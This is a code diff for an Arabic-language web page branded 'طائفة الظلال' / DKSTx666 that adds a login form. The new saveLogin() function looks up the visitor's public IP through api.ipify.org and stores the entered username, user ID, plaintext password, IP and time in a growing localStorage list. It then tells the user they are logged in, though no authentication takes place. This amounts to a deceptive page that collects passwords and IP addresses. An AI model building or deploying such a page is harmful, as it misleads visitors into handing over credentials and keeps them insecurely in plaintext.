@@ -76,6 +76,15 @@
   .btn:hover {
     background: rgba(255,0,0,0.7);
   }
+  input {
+    display: block;
+    margin: 5px 0;
+    padding: 10px;
+    width: 200px;
+    border-radius: 5px;
+    border: none;
+    outline: none;
+  }
 </style>
 </head>
 <body>
@@ -91,25 +100,32 @@
   </div>
   <h1>طائفة الظلال</h1>
   <h2>DKSTx666</h2>
-  <div class="btn" onclick="goLogin()">تسجيل دخول</div>
+  <input type="text" id="username" placeholder="اسم المستخدم">
+  <input type="text" id="userid" placeholder="رمز المستخدم">
+  <input type="password" id="password" placeholder="كلمة السر">
+  <div class="btn" onclick="saveLogin()">تسجيل دخول</div>
   <a href="index" class="btn">إنشاء حساب</a>
   <a href="index" class="btn">دخول مجاني</a>
 
 <script>
-function goLogin(){
-  let username = prompt("أدخل اسم المستخدم:");
-  let password = prompt("أدخل كلمة السر:");
+function saveLogin(){
+  let username = document.getElementById("username").value || "غير معروف";
+  let userid = document.getElementById("userid").value || "غير معروف";
+  let password = document.getElementById("password").value || "غير معروف";
   fetch('https://api.ipify.org?format=json')
     .then(r=>r.json())
     .then(d=>{
-      localStorage.setItem("lastLoginFull", JSON.stringify({
-        username: username || "غير معروف",
-        password: password || "غير معروف",
+      let logins = JSON.parse(localStorage.getItem("logins") || "[]");
+      logins.push({
+        username: username,
+        userid: userid,
+        password: password,
         ip: d.ip,
         time: new Date().toLocaleString("ar-EG")
-      }));
-      window.location.href = "index-zoon.html";
-    })
+      });
+      localStorage.setItem("logins", JSON.stringify(logins));
+      alert("تم تسجيل الدخول");
+    });
 }
 </script>
 </body>
